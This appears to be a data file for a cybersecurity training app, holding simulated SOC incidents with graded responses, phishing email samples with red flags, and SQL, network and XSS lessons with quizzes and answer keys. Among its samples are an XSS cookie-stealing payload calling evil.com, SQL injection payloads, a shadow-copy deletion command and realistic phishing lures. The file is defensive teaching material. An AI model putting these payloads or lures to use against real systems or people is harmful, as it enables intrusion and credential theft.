import { AttackIncident, PhishingEmail, LearningModule, Badge } from '../types';

export const INITIAL_ATTACK_INCIDENTS: AttackIncident[] = [
  {
    id: 'inc-ddos-01',
    name: 'Distributed SYN Flood Volumetric Assault',
    vector: 'Layer 4 TCP SYN Flood (DDoS)',
    severity: 'CRITICAL',
    status: 'ACTIVE',
    targetAsset: 'api-gateway-us-east.cosmic.internal (10.100.4.15:443)',
    sourceIp: 'Botnet Cluster (185.220.101.0/24, 194.26.29.0/24)',
    timestamp: '21:34:12 UTC',
    description: 'Sudden spike of 450,000 half-open TCP connections. SYN backlog is saturated at 98% memory limit. Legitimate customer requests are timing out with 504 Gateway errors.',
    rawLogs: [
      '[21:34:10] KERNEL: TCP: possible SYN flooding on port 443. Sending cookies.',
      '[21:34:11] NGINX: [warn] 28192#0: 40960 worker_connections are not enough',
      '[21:34:12] IPTABLES: DROP IN=eth0 SRC=185.220.101.44 DST=10.100.4.15 PROTO=TCP SPT=49152 DPT=443 FLAGS=SYN',
      '[21:34:12] METRICS: Inbound PPS exceeded threshold: 842,000 pps (Normal: 12,000 pps)',
      '[21:34:13] ALERT: Health check failure for upstream auth-service: Connection refused',
    ],
    optimalSteps: ['enable-syn-cookies', 'rate-limit-cidr', 'route-scrubbing'],
    availableActions: [
      {
        id: 'enable-syn-cookies',
        label: 'Activate Kernel SYN Cookies & Aggressive Backlog Cleanup',
        description: 'Enables cryptographic SYN cookies (tcp_syncookies=1) to prevent state table exhaustion without dropping legitimate new sessions.',
        isCorrect: true,
        costSeconds: 8,
      },
      {
        id: 'rate-limit-cidr',
        label: 'Deploy Ingress BGP Flowspec / Null-Route Attacking CIDRs',
        description: 'Null-routes traffic originating from ASN ranges 185.220.101.0/24 at the border edge.',
        isCorrect: true,
        costSeconds: 15,
      },
      {
        id: 'route-scrubbing',
        label: 'Divert Edge Traffic to Cloud Scrubbing Center',
        description: 'Reroutes DNS/Anycast traffic through volumetric DDoS mitigation scrubbing proxy.',
        isCorrect: true,
        costSeconds: 20,
      },
      {
        id: 'reboot-server',
        label: 'Hard Reboot the Load Balancer Node',
        description: 'Reboots the server immediately, terminating active connections and causing 100% downtime.',
        isCorrect: false,
        costSeconds: 60,
      },
      {
        id: 'ignore-alert',
        label: 'Whitelist All Incoming SYN Packets',
        description: 'Increases socket timeout, allowing the attacker to exhaust kernel memory faster.',
        isCorrect: false,
        costSeconds: 5,
      },
    ],
  },
  {
    id: 'inc-ransom-02',
    name: 'Canary File Encryption & Lateral Movement',
    vector: 'Ransomware Outbreak (LockBit Variant)',
    severity: 'CRITICAL',
    status: 'ACTIVE',
    targetAsset: 'fin-srv-share02.cosmic.internal (10.10.8.22)',
    sourceIp: 'Workstation WS-FIN-09 (10.10.8.109)',
    timestamp: '21:31:48 UTC',
    description: 'Endpoint Detection & Response (EDR) triggered high-frequency file modification alerts on the Finance network share. Honeypot canary file "FIN_Q3_Budget.xlsx.enc" modified. VSS shadow copies deleted.',
    rawLogs: [
      '[21:31:45] EDR-AGENT: Process "svchost_update.exe" spawned by powershell.exe under WS-FIN-09',
      '[21:31:46] CMD: vssadmin delete shadows /all /quiet -> Exit 0',
      '[21:31:47] FILE_MON: 840 files renamed to *.cosmic_locked in /shares/accounting within 1.2s',
      '[21:31:48] CANARY_ALERT: Decoy canary document accessed and overwritten with ransom note instructions',
      '[21:31:49] NET_FLOW: Outbound connection from WS-FIN-09 to TOR exit node 176.10.99.200:9001',
    ],
    optimalSteps: ['isolate-workstation', 'kill-c2-conn', 'restore-immutable-backup'],
    availableActions: [
      {
        id: 'isolate-workstation',
        label: 'Isolate Host WS-FIN-09 from Enterprise Network (EDR Quarantine)',
        description: 'Sever network connectivity to WS-FIN-09 while preserving live RAM memory for forensics.',
        isCorrect: true,
        costSeconds: 5,
      },
      {
        id: 'kill-c2-conn',
        label: 'Terminate Process & Block Outbound C2 IP at Firewall',
        description: 'Kills malicious process tree and blackholes outbound connection to 176.10.99.200.',
        isCorrect: true,
        costSeconds: 12,
      },
      {
        id: 'restore-immutable-backup',
        label: 'Initiate Point-in-Time Restore from Air-Gapped Immutable Snapshots',
        description: 'Roll back encrypted SMB volume to the clean snapshot from 21:00:00 UTC.',
        isCorrect: true,
        costSeconds: 25,
      },
      {
        id: 'pay-ransom',
        label: 'Contact Threat Actor via Tor Portal to Negotiate Ransom',
        description: 'Violates corporate policy and OFAC regulations with zero guarantee of key decryption.',
        isCorrect: false,
        costSeconds: 90,
      },
      {
        id: 'power-off-server',
        label: 'Cut Power Cord to Finance Share Server',
        description: 'Causes filesystem corruption and wipes volatile memory forensics.',
        isCorrect: false,
        costSeconds: 30,
      },
    ],
  },
  {
    id: 'inc-sqli-03',
    name: 'Blind SQL Injection Probe on Customer Portal',
    vector: 'Application-Layer Web Vulnerability (OWASP A03:2021)',
    severity: 'HIGH',
    status: 'ACTIVE',
    targetAsset: 'portal.cosmic.internal/auth/login.php',
    sourceIp: '45.154.255.89 (Hosting Provider AS-PONY)',
    timestamp: '21:32:05 UTC',
    description: 'WAF detected automated sqlmap fuzzing against user login parameter. Attacker probing database fingerprint using time-based blind SQL injection sleep payloads.',
    rawLogs: [
      "[21:32:01] WAF_RULE_942100: SQL Injection Attempt detected: user=admin' AND (SELECT 9923 FROM (SELECT(SLEEP(5)))a)--",
      "[21:32:03] HTTP_ACCESS: 45.154.255.89 POST /auth/login.php HTTP/1.1 200 (response time: 5042ms)",
      "[21:32:04] DB_SLOW_LOG: Query took 5.041s: SELECT id, password FROM users WHERE username='admin' AND (SELECT 9923...",
      "[21:32:05] WAF: Attack signature match: sqlmap/1.7.2#stable user-agent header detected",
    ],
    optimalSteps: ['block-ip-waf', 'hotpatch-parameterized-query', 'audit-db-privileges'],
    availableActions: [
      {
        id: 'block-ip-waf',
        label: 'Deploy Dynamic WAF Shun Rule for IP 45.154.255.89',
        description: 'Immediately drop all incoming HTTP requests matching the offending IP address.',
        isCorrect: true,
        costSeconds: 6,
      },
      {
        id: 'hotpatch-parameterized-query',
        label: 'Hotpatch Backend Controller to Enforce Prepared Statements',
        description: 'Refactors raw query string concatenation into PDO parameterized query with typed inputs.',
        isCorrect: true,
        costSeconds: 22,
      },
      {
        id: 'audit-db-privileges',
        label: 'Restrict Database User Privileges (Least Privilege)',
        description: 'Revokes FILE and SUPER privileges from web application database connection user.',
        isCorrect: true,
        costSeconds: 15,
      },
      {
        id: 'disable-waf',
        label: 'Disable WAF to Reduce Server CPU Load',
        description: 'Exposes backend database completely to full automated database dump extraction.',
        isCorrect: false,
        costSeconds: 10,
      },
    ],
  },
  {
    id: 'inc-ssh-04',
    name: 'Distributed SSH Credential Stuffing Campaign',
    vector: 'Identity Attack & Password Spraying',
    severity: 'MEDIUM',
    status: 'ACTIVE',
    targetAsset: 'bastion-prod.cosmic.internal (10.0.1.5:22)',
    sourceIp: 'Tor Exit Cluster (103.251.167.0/24)',
    timestamp: '21:33:19 UTC',
    description: 'Over 12,000 failed SSH authentication attempts within 3 minutes targeting system accounts (root, oracle, deploy, devops) using known credential leaks.',
    rawLogs: [
      '[21:33:15] SSHD: Failed password for invalid user deploy from 103.251.167.22 port 52311 ssh2',
      '[21:33:16] SSHD: Failed password for root from 103.251.167.89 port 41208 ssh2',
      '[21:33:17] SSHD: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh',
      '[21:33:18] FAIL2BAN: 103.251.167.0/24 exceeded max_retries limit (5 failed attempts / 60s)',
    ],
    optimalSteps: ['enforce-ssh-keys-only', 'change-ssh-port-vpn', 'deploy-fail2ban-ipset'],
    availableActions: [
      {
        id: 'enforce-ssh-keys-only',
        label: 'Disable PasswordAuthentication in sshd_config (Keys + FIDO2 Only)',
        description: 'Stops all password-guessing attempts dead in their tracks by requiring signed ed25519 cryptographic keys.',
        isCorrect: true,
        costSeconds: 10,
      },
      {
        id: 'change-ssh-port-vpn',
        label: 'Restrict Bastion SSH Ingress to Corporate VPN Gateway Only',
        description: 'Closes public internet port 22; requires wireguard / IPsec tunnel authentication.',
        isCorrect: true,
        costSeconds: 14,
      },
      {
        id: 'deploy-fail2ban-ipset',
        label: 'Activate Fail2ban with IPSet Automated Jail Rules',
        description: 'Automatically bans IPs generating more than 3 invalid login attempts within 10 minutes.',
        isCorrect: true,
        costSeconds: 8,
      },
      {
        id: 'set-blank-root-password',
        label: 'Enable Root Login with No Password for Easy Admin Access',
        description: 'Catastrophic misconfiguration allowing instant full remote privilege takeover.',
        isCorrect: false,
        costSeconds: 5,
      },
    ],
  },
  {
    id: 'inc-dns-05',
    name: 'DNS Tunneling & C2 Data Exfiltration',
    vector: 'Covert Channel Data Theft (MITRE T1071.004)',
    severity: 'HIGH',
    status: 'ACTIVE',
    targetAsset: 'dc-primary.cosmic.internal (10.0.0.10)',
    sourceIp: 'Internal Client HOST-CORP-44 (10.0.2.144)',
    timestamp: '21:34:02 UTC',
    description: 'Anomalous burst of 14,000 TXT / NULL DNS record queries containing high-entropy base64 encoded strings directed to rogue authoritative nameserver *.c2-exfil-net.xyz.',
    rawLogs: [
      '[21:34:00] BIND9_QUERY: client 10.0.2.144: query: dXNlcl9jcmVkcy1hZG1pbjEyMw==.chunk1.c2-exfil-net.xyz IN TXT',
      '[21:34:01] BIND9_QUERY: client 10.0.2.144: query: cGFzc3dvcmRfaGFzaGVzX2V4cG9ydA==.chunk2.c2-exfil-net.xyz IN TXT',
      '[21:34:02] ZEKE_SENSOR: DNS anomaly score 0.98: Shannon entropy of subdomains exceeds 4.7 bits',
      '[21:34:03] SIEM: Correlation: Suspicious outbound DNS TXT bandwidth exceeded 25 MB/hr',
    ],
    optimalSteps: ['sinkhole-dns-domain', 'isolate-host-corp-44', 'inspect-dns-payload'],
    availableActions: [
      {
        id: 'sinkhole-dns-domain',
        label: 'RPZ DNS Sinkhole *.c2-exfil-net.xyz to Internal Honeypot IP (127.0.0.1)',
        description: 'Reroutes all malicious DNS queries to a local loopback blackhole, halting outbound data theft.',
        isCorrect: true,
        costSeconds: 7,
      },
      {
        id: 'isolate-host-corp-44',
        label: 'Quarantine HOST-CORP-44 & Dump Memory for Malware Analysis',
        description: 'Prevents malware from pivoting to alternative exfiltration channels like HTTPS/WebSockets.',
        isCorrect: true,
        costSeconds: 15,
      },
      {
        id: 'inspect-dns-payload',
        label: 'Extract and Decode Base64 Staged Payloads to Assess Breach Scope',
        description: 'Determines precisely which classified files or credentials were intercepted.',
        isCorrect: true,
        costSeconds: 18,
      },
      {
        id: 'allow-all-dns',
        label: 'Open External UDP Port 53 to All Outbound Public DNS Resolvers',
        description: 'Bypasses internal logging and allows full unmonitored data loss.',
        isCorrect: false,
        costSeconds: 10,
      },
    ],
  },
];

export const PHISHING_EMAILS: PhishingEmail[] = [
  {
    id: 'phish-01',
    senderName: 'Microsoft 365 Security Team',
    senderEmail: 'security-alerts@login.microsoftonline.com.sec-verify88.cc',
    replyTo: 'harvester-drop@sec-verify88.cc',
    subject: 'CRITICAL: Your Microsoft 365 Password Expires in 2 Hours',
    date: 'Today at 09:14 AM',
    isPhish: true,
    spf: 'Fail',
    dkim: 'Fail',
    dmarc: 'Fail',
    originatingIp: '185.191.171.12 (Khabarovsk, RU)',
    snippet: 'Immediate action required. Your multi-factor credentials will be locked due to scheduled server migration.',
    bodyHtml: `
      <div style="font-family: Arial, sans-serif; padding: 16px; color: #1e293b;">
        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 16px;">
          <div style="width: 24px; height: 24px; background: #0078d4; border-radius: 2px;"></div>
          <strong style="color: #0078d4; font-size: 18px;">Microsoft Security Alert</strong>
        </div>
        <p>Dear Valued Colleague,</p>
        <p>Your institutional Microsoft 365 password token will expire in <strong>2 hours</strong> due to cloud security synchronization.</p>
        <p style="background: #fef2f2; border-left: 4px solid #ef4444; padding: 12px; color: #991b1b;">
          Failure to renew your session key immediately will result in complete account suspension and loss of access to Outlook, OneDrive, and Teams.
        </p>
        <p style="margin: 24px 0;">
          <a href="#" style="background: #0078d4; color: #ffffff; padding: 10px 20px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block;">
            Keep Current Password & Re-authenticate
          </a>
        </p>
        <p style="font-size: 12px; color: #64748b;">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052.</p>
      </div>
    `,
    links: [
      {
        displayText: 'Keep Current Password & Re-authenticate',
        actualUrl: 'https://login.microsoftonline.com.sec-verify88.cc/harvest/session_auth.php?token=emp4819',
        isMalicious: true,
      },
    ],
    redFlags: [
      'Sender domain lookalike: sec-verify88.cc disguised with subdomain prefix',
      'Extreme artificial urgency (Expires in 2 hours)',
      'SPF and DKIM cryptographic signature verification failed',
      'Hyperlink redirects to an external credential harvesting portal',
    ],
    explanation: 'Classic spear-phishing credential harvester. Microsoft never issues 2-hour emergency password expiration threats, and the actual destination URL points to a Russian hosting server disguised behind a nested subdomain.',
  },
  {
    id: 'phish-02',
    senderName: 'David Vance (Chief Executive Officer)',
    senderEmail: 'david.vance.ceo@gmail-corpmail-relay.net',
    replyTo: 'private-exec-channel99@gmail.com',
    subject: 'Confidential: Urgent Apple Gift Cards for Board VIPs',
    date: 'Today at 10:45 AM',
    isPhish: true,
    spf: 'SoftFail',
    dkim: 'None',
    dmarc: 'Fail',
    originatingIp: '102.164.218.4 (Lagos, NG)',
    snippet: 'Are you at your desk right now? I am stuck in an all-day investor meeting and need you to handle a secret surprise.',
    bodyHtml: `
      <div style="font-family: sans-serif; padding: 16px; color: #0f172a;">
        <p>Hi,</p>
        <p>Are you in the office right now? I am in an impromptu board meeting with investors and cannot take phone calls.</p>
        <p>I need a quick favor. Please purchase 5x $100 Apple Store digital gift cards for the visiting board members. Expense it to department code EXEC-901 and send the scratch-off PIN codes directly to my private email here.</p>
        <p>Please keep this strictly confidential as it is a surprise celebration. Do not call my cell phone as audio is restricted in the boardroom.</p>
        <br/>
        <p>Best regards,</p>
        <p><strong>David Vance</strong><br/>CEO, Cosmic Technologies</p>
      </div>
    `,
    links: [],
    redFlags: [
      'Executive impersonation / Business Email Compromise (BEC)',
      'Pretexting isolation ("In a meeting, cannot take phone calls")',
      'Gift card payment request (untraceable, non-standard procurement method)',
      'Reply-To header redirected to consumer Gmail address',
    ],
    explanation: 'This is a textbook CEO Fraud / Business Email Compromise (BEC). Attackers exploit executive authority and demand gift cards because they are untraceable and non-refundable.',
  },
  {
    id: 'phish-03',
    senderName: 'FedEx Express Courier Delivery',
    senderEmail: 'notifications@fedx-tracking-portal-us.com',
    replyTo: 'dispatch@fedx-tracking-portal-us.com',
    subject: 'Delivery Exception: Package #78192014 Undeliverable',
    date: 'Yesterday at 04:12 PM',
    isPhish: true,
    spf: 'Fail',
    dkim: 'Fail',
    dmarc: 'Fail',
    originatingIp: '91.240.118.80 (Amsterdam, NL)',
    snippet: 'Your parcel could not be delivered due to an incorrect postal address. Download the revised shipping manifest receipt.',
    bodyHtml: `
      <div style="font-family: Arial, sans-serif; padding: 16px; color: #1e293b;">
        <div style="font-size: 24px; font-weight: 800; color: #4d148c; margin-bottom: 12px;">Fed<span style="color: #ff6200;">Ex</span></div>
        <p><strong>Shipment Status: Delivery Suspended</strong></p>
        <p>Our courier driver attempted delivery of package tracking number <strong>#78192014-US</strong>, but the street address provided was invalid.</p>
        <p>A $3.50 redelivery fee must be authorized within 24 hours or the parcel will be destroyed at customs.</p>
        <p style="margin: 20px 0;">
          <a href="#" style="background: #ff6200; color: #fff; padding: 10px 18px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block;">
            Download Shipping Invoice & Update Address
          </a>
        </p>
        <p style="font-size: 11px; color: #94a3b8;">Attachment: Delivery_Notice_Invoice.zip (contains malware droplet)</p>
      </div>
    `,
    links: [
      {
        displayText: 'Download Shipping Invoice & Update Address',
        actualUrl: 'http://malware-drop-cdn.xyz/payloads/Delivery_Notice_Invoice.zip',
        isMalicious: true,
      },
    ],
    redFlags: [
      'Lookalike domain typo: "fedx" instead of "fedex.com"',
      'Urgency and small fee demand ($3.50 customs destruction fee)',
      'Dangerous file download payload (.zip archive)',
      'Unsigned headers failing SPF authentication',
    ],
    explanation: 'Smishing/Phishing blend targeting delivery curiosity. The hyperlink drops an executable trojan disguised as a shipping invoice receipt.',
  },
  {
    id: 'phish-04',
    senderName: 'GitHub Security Advisory',
    senderEmail: 'notifications@github.com',
    replyTo: 'support@github.com',
    subject: '[GitHub] A new personal access token was generated for @vinayak-dev',
    date: 'Yesterday at 02:18 PM',
    isPhish: false,
    spf: 'Pass',
    dkim: 'Pass',
    dmarc: 'Pass',
    originatingIp: '140.82.112.4 (San Francisco, US - Official GitHub Netblock)',
    snippet: 'A personal access token (classic) was recently generated from IP 192.0.2.1 on your GitHub account.',
    bodyHtml: `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; padding: 16px; color: #24292f;">
        <h3 style="margin-top: 0; color: #24292f;">New personal access token generated</h3>
        <p>Hey @vinayak-dev,</p>
        <p>A personal access token with scopes <code>repo, read:org</code> was generated on your account from IP address <code>192.0.2.1</code>.</p>
        <p>If you created this token, no further action is required. If you did not generate this token, please visit your security settings to revoke it immediately.</p>
        <p style="margin: 20px 0;">
          <a href="#" style="background: #2da44e; color: #ffffff; padding: 8px 16px; text-decoration: none; border-radius: 6px; font-weight: 600; display: inline-block;">
            Review Security Settings
          </a>
        </p>
        <p style="font-size: 12px; color: #57606a;">GitHub, Inc. 88 Colin P Kelly Jr St, San Francisco, CA 94107</p>
      </div>
    `,
    links: [
      {
        displayText: 'Review Security Settings',
        actualUrl: 'https://github.com/settings/tokens',
        isMalicious: false,
      },
    ],
    redFlags: [],
    explanation: 'This is a genuine, verified security notification from GitHub. Both SPF and DKIM signatures pass with perfect DMARC alignment, and the link leads directly to official github.com/settings/tokens.',
  },
  {
    id: 'phish-05',
    senderName: 'HR Benefits Department',
    senderEmail: 'benefits@internal-workday-reward-hub.com',
    replyTo: 'benefits-claim@internal-workday-reward-hub.com',
    subject: 'Q3 Inflation Compensation Bonus - Submit Direct Deposit',
    date: '2 days ago',
    isPhish: true,
    spf: 'Fail',
    dkim: 'None',
    dmarc: 'Fail',
    originatingIp: '193.106.191.55 (Bucharest, RO)',
    snippet: 'All full-time staff are eligible for a $1,250 one-time retention stipend. Verify your banking routing number before Friday.',
    bodyHtml: `
      <div style="font-family: Arial, sans-serif; padding: 16px; color: #1e293b;">
        <h2 style="color: #059669; margin-top: 0;">2026 Employee Inflation Relief Grant</h2>
        <p>Dear Staff Member,</p>
        <p>In recognition of recent cost-of-living adjustments, the Executive Committee has authorized a <strong>$1,250 net bonus</strong> for all employees active as of October 2026.</p>
        <p>Due to banking compliance regulations, you must re-verify your payroll ACH account details via our encrypted Workday partner portal by 5:00 PM this Friday.</p>
        <p style="margin: 22px 0;">
          <a href="#" style="background: #059669; color: #fff; padding: 10px 18px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block;">
            Verify Direct Deposit in Workday Portal
          </a>
        </p>
        <p style="font-size: 12px; color: #64748b;">Internal HR Payroll Operations.</p>
      </div>
    `,
    links: [
      {
        displayText: 'Verify Direct Deposit in Workday Portal',
        actualUrl: 'https://workday.internal-workday-reward-hub.com/payroll/login.php',
        isMalicious: true,
      },
    ],
    redFlags: [
      'Spoofed internal HR brand hosted on third-party lookalike domain',
      'Greed and urgency lure (free money stimulus with tight deadline)',
      'Requests direct submission of banking routing and account credentials',
      'Sender domain created less than 48 hours ago',
    ],
    explanation: 'HR stipend phishing is one of the highest-converting corporate social engineering scams. Attackers prey on economic anxieties to steal bank payroll credentials.',
  },
  {
    id: 'phish-06',
    senderName: 'Slack Technologies',
    senderEmail: 'feedback@slack.com',
    replyTo: 'feedback@slack.com',
    subject: 'New login to Slack from Firefox on macOS',
    date: '3 days ago',
    isPhish: false,
    spf: 'Pass',
    dkim: 'Pass',
    dmarc: 'Pass',
    originatingIp: '54.240.14.78 (Amazon AWS SES, Slack Authorized Mailer)',
    snippet: 'Your Slack account cosmicsoc.slack.com was just accessed from a new device in San Jose, California.',
    bodyHtml: `
      <div style="font-family: sans-serif; padding: 16px; color: #1d1c1d;">
        <div style="font-size: 20px; font-weight: bold; margin-bottom: 12px; color: #4a154b;">slack</div>
        <p>Hi Vinayak,</p>
        <p>Your Slack account was just logged into from a new browser session:</p>
        <ul style="background: #f8fafc; padding: 12px 24px; border-radius: 6px; font-size: 14px;">
          <li><strong>Device:</strong> Firefox on macOS</li>
          <li><strong>Location:</strong> San Jose, California, USA</li>
          <li><strong>IP Address:</strong> 198.51.100.44</li>
        </ul>
        <p>If this was you, you can safely ignore this alert. If you did not log in, manage your active sessions immediately.</p>
        <p style="margin: 18px 0;">
          <a href="#" style="background: #007a5a; color: #fff; padding: 8px 16px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block;">
            Manage Active Sessions
          </a>
        </p>
      </div>
    `,
    links: [
      {
        displayText: 'Manage Active Sessions',
        actualUrl: 'https://slack.com/account/settings',
        isMalicious: false,
      },
    ],
    redFlags: [],
    explanation: 'Legitimate login alert from Slack. DKIM and SPF checks pass from official Amazon SES mail servers authorized under slack.com SPF record, and the destination URL leads directly to slack.com.',
  },
];

export const LEARNING_MODULES: LearningModule[] = [
  {
    id: 'mod-sql-fundamentals',
    title: 'Module 1: SQL Fundamentals & Vulnerabilities',
    track: 'DEFENSIVE',
    description: 'Master core SQL query structure, table filtering, and understand why unparameterized query concatenation leads to catastrophic authentication bypasses.',
    lessons: [
      {
        id: 'lesson-select-from',
        title: 'SELECT & FROM Query Architecture',
        level: 'BEGINNER',
        duration: '10 min',
        summary: 'Understand the primary syntax of data retrieval in relational databases and how unauthorized columns can be enumerated.',
        keyConcepts: [
          'SELECT specifies the target projection attributes (columns).',
          'FROM identifies the source entity table in the database schema.',
          'Using wildcard SELECT * leaks all sensitive hidden fields (password hashes, SSNs, salts).',
        ],
        codeSnippet: `-- Safe practice: project only required public fields\nSELECT user_id, username, display_name FROM accounts;`,
        quiz: {
          id: 'q-sql-1',
          question: 'Why is using "SELECT *" considered bad security practice in production applications?',
          options: [
            'It slows down query speed by 90% in every database engine.',
            'It inadvertently exposes newly added private/sensitive columns (e.g. password_hash, tokens) to the client.',
            'SQL databases throw an unhandled syntax error when asterisks are used.',
            'It grants write permissions to read-only database connections.',
          ],
          correctIndex: 1,
          explanation: 'Over-fetching via "SELECT *" leaks sensitive metadata, salts, and tokens that might be added to the schema in future migrations.',
          xpReward: 80,
        },
      },
      {
        id: 'lesson-where-clause',
        title: 'WHERE Clause & Boolean Logic Tautologies',
        level: 'BEGINNER',
        duration: '15 min',
        summary: 'Explore conditional operators (=, AND, OR) and how attackers inject boolean tautologies like "1=1" to negate authentication guards.',
        keyConcepts: [
          'The WHERE clause filters rows based on a boolean predicate (TRUE or FALSE).',
          'An OR operator evaluates to TRUE if either condition is TRUE.',
          'Injecting "OR 1=1" forces the database engine to evaluate the entire WHERE clause as ALWAYS TRUE.',
        ],
        codeSnippet: `-- Attacker injection breakdown:\nSELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'xxx';\n-- Since '1'='1' is always TRUE, the password check is discarded!`,
        quiz: {
          id: 'q-sql-2',
          question: 'What is the role of "--" in a standard SQL injection payload?',
          options: [
            'It forces the database to subtract the current user count.',
            'It acts as a comment delimiter, causing the database to ignore all subsequent query code (including password checks).',
            'It instructs the database to encrypt the input string.',
            'It rolls back the database transaction.',
          ],
          correctIndex: 1,
          explanation: 'In SQL (PostgreSQL, SQLite, MySQL), "--" begins a line comment. Any trailing SQL syntax (such as AND password = "$hash") is completely ignored by the query parser!',
          xpReward: 100,
        },
      },
      {
        id: 'lesson-sqli-defense',
        title: 'Parameterized Queries & Prepared Statements',
        level: 'INTERMEDIATE',
        duration: '15 min',
        summary: 'Implement parameterized prepared statements that separate executable SQL code from untrusted user data.',
        keyConcepts: [
          'Prepared statements pre-compile the SQL statement template before binding user input.',
          'Database engines treat user input bound to parameters strictly as literal data, never executable syntax.',
          'Object-Relational Mappers (ORMs) and query builders automate parameterization by default.',
        ],
        codeSnippet: `// SECURE Prepared Statement in Node.js / Python\nconst stmt = db.prepare('SELECT id, role FROM users WHERE username = ? AND password_hash = ?');\nstmt.get(userInput, hash);`,
        quiz: {
          id: 'q-sql-3',
          question: 'Why are Prepared Statements immune to classic SQL injection attacks?',
          options: [
            'They encrypt the database server using AES-256.',
            'The database parses the query structure before binding user input, treating all input strictly as literal strings or values.',
            'They automatically strip all single quote characters from input.',
            'They only run in read-only sandbox mode.',
          ],
          correctIndex: 1,
          explanation: 'Because the database engine compiles the query tree before parameters are supplied, even if user input contains quotes or "OR 1=1", it is treated as a literal search value, not executable code.',
          xpReward: 120,
        },
      },
    ],
  },
  {
    id: 'mod-network-defense',
    title: 'Module 2: Network Protocols & Port Security',
    track: 'NETWORKING',
    description: 'Inspect TCP/IP handshakes, common service ports, Wireshark packet anatomy, and firewall packet-filtering rules.',
    lessons: [
      {
        id: 'lesson-tcp-handshake',
        title: 'The TCP Three-Way Handshake (SYN, SYN-ACK, ACK)',
        level: 'BEGINNER',
        duration: '12 min',
        summary: 'Learn how reliable stateful connections are established and how half-open connections are exploited in SYN flood attacks.',
        keyConcepts: [
          'Step 1 (SYN): Client sends Initial Sequence Number (ISN).',
          'Step 2 (SYN-ACK): Server acknowledges and sends its own sequence number.',
          'Step 3 (ACK): Client acknowledges, and state transitions to ESTABLISHED.',
          'Half-open states allocate memory in the server backlog queue until timeout.',
        ],
        codeSnippet: `Client --[ SYN (seq=100) ]--> Server\nClient <--[ SYN-ACK (seq=300, ack=101) ]-- Server\nClient --[ ACK (ack=301) ]--> Server  (State: ESTABLISHED)`,
        quiz: {
          id: 'q-net-1',
          question: 'How do SYN Cookies protect a server against SYN Flood attacks?',
          options: [
            'They block all incoming HTTP cookies at the browser.',
            'They encode connection state into the initial SYN-ACK sequence number, avoiding memory backlog allocation until the client completes the handshake.',
            'They reboot the web server when memory usage exceeds 90%.',
            'They mandate 2-factor authentication before opening any TCP port.',
          ],
          correctIndex: 1,
          explanation: 'SYN Cookies eliminate the SYN backlog table altogether by computing a cryptographic hash of client IP/port and timestamp as the initial sequence number, verifying it only upon the final ACK.',
          xpReward: 90,
        },
      },
      {
        id: 'lesson-ports-recon',
        title: 'Port Scanning & Common Service Exposures',
        level: 'INTERMEDIATE',
        duration: '15 min',
        summary: 'Identify dangerous legacy services like Telnet (23) and unauthenticated databases exposed to the public internet.',
        keyConcepts: [
          'Port 21: FTP (Cleartext authentication, frequent anonymous login issues).',
          'Port 22: SSH (Secure Shell, should enforce public-key auth only).',
          'Port 23: Telnet (Transmits passwords in unencrypted plain text over the wire).',
          'Port 3306 / 5432: MySQL / PostgreSQL (Should never be exposed to 0.0.0.0/0).',
        ],
        codeSnippet: `# Nmap SYN stealth scan syntax\nnmap -sS -p 21,22,23,80,443,3306 -T4 target_host.com`,
        quiz: {
          id: 'q-net-2',
          question: 'Why is Telnet (port 23) strictly forbidden in modern enterprise production environments?',
          options: [
            'It requires too much CPU processing power.',
            'It transmits all session data and passwords in unencrypted plain text, allowing trivial sniffing via Wireshark on the local network.',
            'It only runs on ancient mainframe hardware.',
            'It cannot establish TCP connections over IPv6.',
          ],
          correctIndex: 1,
          explanation: 'Telnet transmits every single keystroke in clear text. Any attacker sniffing the network with Wireshark or ARP spoofing can read usernames and passwords instantly.',
          xpReward: 90,
        },
      },
    ],
  },
  {
    id: 'mod-offensive-web',
    title: 'Module 3: Web Application Exploits & XSS',
    track: 'OFFENSIVE',
    description: 'Understand Reflected, Stored, and DOM-based Cross-Site Scripting (XSS), session hijacking, and defense with Content Security Policy (CSP).',
    lessons: [
      {
        id: 'lesson-xss-mechanics',
        title: 'Cross-Site Scripting (XSS) Mechanics',
        level: 'INTERMEDIATE',
        duration: '15 min',
        summary: 'Explore how unsanitized user inputs inject executable JavaScript into other users browsers.',
        keyConcepts: [
          'Reflected XSS: Input from URL parameters or search forms immediately reflected in response.',
          'Stored XSS: Malicious payload saved to database (e.g. comment forum) and executed for all visitors.',
          'Payloads can access document.cookie (session theft), redirect users, or log keystrokes.',
        ],
        codeSnippet: `<!-- Vulnerable Reflection -->\n<div>Search results for: <?php echo $_GET['q']; ?></div>\n<!-- Attacker input: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> -->`,
        quiz: {
          id: 'q-xss-1',
          question: 'Which HTTP cookie flag prevents client-side JavaScript from accessing session tokens via document.cookie?',
          options: [
            'SameSite=Lax',
            'Secure',
            'HttpOnly',
            'Domain=localhost',
          ],
          correctIndex: 2,
          explanation: 'The "HttpOnly" flag instructs browsers that the cookie must never be accessible through client-side scripts like document.cookie, completely thwarting basic XSS session theft.',
          xpReward: 100,
        },
      },
    ],
  },
];

export const BADGES_LIST: Badge[] = [
  {
    id: 'badge-initiate',
    name: 'Cosmic Cadet',
    description: 'Initiated training in the CosmicSOC Cybersecurity Learning Lab.',
    iconName: 'Shield',
    unlockedAtXp: 0,
  },
  {
    id: 'badge-entropy',
    name: 'Entropy Specialist',
    description: 'Calculated and analyzed high-entropy cryptographic passphrases.',
    iconName: 'KeyRound',
    requiredAction: 'password-lab-tested',
  },
  {
    id: 'badge-phish-hunter',
    name: 'Phish Catcher',
    description: 'Successfully triaged and quarantined malicious spear-phishing emails.',
    iconName: 'Fish',
    requiredAction: 'phish-quarantined',
  },
  {
    id: 'badge-war-hero',
    name: 'SOC War Room Responder',
    description: 'Contained a live simulated enterprise cyber assault.',
    iconName: 'Flame',
    requiredAction: 'incident-contained',
  },
  {
    id: 'badge-sqli-buster',
    name: 'Injection Terminator',
    description: 'Identified and defended against SQL Injection vulnerabilities in the sandbox.',
    iconName: 'Database',
